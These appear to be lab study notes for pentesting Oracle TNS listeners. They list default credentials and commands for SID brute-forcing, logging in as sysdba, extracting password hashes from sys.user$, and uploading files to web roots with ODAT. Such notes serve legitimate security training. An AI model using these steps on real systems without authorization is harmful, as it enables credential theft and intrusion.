# Oracle TNS Pentest Notes

## Overview
- **Oracle Transparent Network Substrate (TNS):** Protocol for communication between Oracle DBs and clients.
- Supports multiple protocols (TCP/IP, IPX/SPX, SSL/TLS, IPv6).
- Used for: name resolution, connection management, load balancing, security.
- Key config files: `tnsnames.ora` (client-side), `listener.ora` (server-side).

---

## Default Configuration
- **Listener Port:** TCP/1521 (default, can be changed).
- **Config Files Location:** `$ORACLE_HOME/network/admin`
- **Security:** Basic authentication, can restrict by host/IP, supports encrypted comms.
- **Default Passwords:** 
    - Oracle 9: `CHANGE_ON_INSTALL`
    - DBSNMP: `dbsnmp`
    - Oracle 10+: No default password

### Example: `tnsnames.ora`
```txt
ORCL =
    (DESCRIPTION =
        (ADDRESS_LIST =
            (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
        )
        (CONNECT_DATA =
            (SERVER = DEDICATED)
            (SERVICE_NAME = orcl)
        )
    )
```

### Example: `listener.ora`
```txt
SID_LIST_LISTENER =
    (SID_LIST =
        (SID_DESC =
            (SID_NAME = PDB1)
            (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)
            (GLOBAL_DBNAME = PDB1)
            (SID_DIRECTORY_LIST =
                (SID_DIRECTORY =
                    (DIRECTORY_TYPE = TNS_ADMIN)
                    (DIRECTORY = C:\oracle\product\19.0.0\dbhome_1\network\admin)
                )
            )
        )
    )

LISTENER =
    (DESCRIPTION_LIST =
        (DESCRIPTION =
            (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))
            (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))
        )
    )

ADR_BASE_LISTENER = C:\oracle
```

---

## Key Parameters (Cheatsheet)
| Setting                | Description                                               |
|------------------------|----------------------------------------------------------|
| DESCRIPTION            | Descriptor for DB and connection type                    |
| ADDRESS                | Hostname/IP and port                                     |
| PROTOCOL               | Network protocol (TCP, etc.)                             |
| PORT                   | Port number                                              |
| CONNECT_DATA           | Connection attributes (service/SID, etc.)                |
| INSTANCE_NAME          | DB instance name                                         |
| SERVICE_NAME           | Service name                                             |
| USER/PASSWORD          | Auth credentials                                         |
| SECURITY               | Security type                                            |
| VALIDATE_CERT          | SSL/TLS cert validation                                 |
| SSL_VERSION            | SSL/TLS version                                          |
| CONNECT_TIMEOUT        | Connection timeout (sec)                                 |
| SQLNET.EXPIRE_TIME     | Connection failure detection (sec)                       |
| TRACE_LEVEL, TRACE_DIR | Tracing/debugging                                        |

---

## Tools & Setup

### Install Oracle Instant Client & ODAT
```bash
wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
sudo mkdir -p /opt/oracle
sudo unzip -d /opt/oracle instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
sudo unzip -d /opt/oracle instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
export LD_LIBRARY_PATH=/opt/oracle/instantclient_21_4:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH
source ~/.bashrc
git clone https://github.com/quentinhardy/odat.git
cd odat/
pip install python-libnmap
git submodule init && git submodule update
pip3 install cx_Oracle pycryptodome
sudo apt-get install python3-scapy build-essential libgmp-dev -y
sudo pip3 install colorlog termcolor passlib python-libnmap
```

### Test ODAT
```bash
./odat.py -h
```

---

## Enumeration & Exploitation

### Nmap: Service Detection
```bash
sudo nmap -p1521 -sV <target-ip> --open
```

### Nmap: SID Bruteforce
```bash
sudo nmap -p1521 -sV <target-ip> --open --script oracle-sid-brute
```

### ODAT: All Modules
```bash
./odat.py all -s <target-ip>
```

### SQLplus: Connect
```bash
sqlplus scott/tiger@XE
```
- If error: `libsqlplus.so` missing, run:
    ```bash
    sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf"; sudo ldconfig
    ```

### SQLplus: Enumerate Tables & Privileges
```sql
select table_name from all_tables;
select * from user_role_privs;
```

### SQLplus: Connect as sysdba
```bash
sqlplus scott/tiger@XE as sysdba
```

### SQLplus: Extract Password Hashes
```sql
select name, password from sys.user$;
```

---

## File Upload (ODAT)
- **Linux web root:** `/var/www/html`
- **Windows web root:** `C:\inetpub\wwwroot`

```bash
echo "Oracle File Upload Test" > testing.txt
./odat.py utlfile -s <target-ip> -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
curl -X GET http://<target-ip>/testing.txt
```

---

## Best Practices & Pitfalls
- Change default passwords immediately after install.
- Restrict listener to trusted IPs.
- Disable remote management if not needed.
- Regularly audit user privileges and roles.
- Monitor logs for suspicious activity.

---

## Useful Links
- [Oracle Net Services Docs](https://docs.oracle.com/en/database/oracle/oracle-database/18/netag/introducing-oracle-net-services.html)
- [ODAT Tool](https://github.com/quentinhardy/odat)
- [SQLplus Commands](https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm#SQLQR985)
- [Nmap Oracle Scripts](https://nmap.org/nsedoc/scripts/oracle-sid-brute.html)

---

## Checklist

- [ ] Install Oracle Instant Client & ODAT
- [ ] Enumerate open ports/services (nmap)
- [ ] Bruteforce SIDs (nmap/odat)
- [ ] Enumerate users/credentials (odat)
- [ ] Connect with SQLplus
- [ ] Enumerate tables, roles, privileges
- [ ] Extract password hashes
- [ ] Attempt file upload (if applicable)
- [ ] Document findings & mitigations
